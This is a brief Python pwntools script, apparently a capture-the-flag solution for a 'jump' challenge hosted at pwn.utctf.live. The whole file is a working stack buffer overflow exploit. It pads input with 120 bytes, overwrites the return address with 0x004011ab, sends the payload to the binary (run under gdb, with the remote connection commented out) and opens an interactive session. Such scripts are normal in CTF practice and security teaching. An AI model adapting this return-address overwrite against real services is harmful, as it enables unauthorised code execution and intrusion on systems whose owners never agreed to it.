from pwn import *

#nc pwn.utctf.live 5001
#p = remote('pwn.utctf.live', 5001)

#p = process('./jump')
p=gdb.debug('./jump')
p.recv()

payload = b'A' * 120
payload += p64(0x004011ab)

p.sendline(payload)
p.interactive()
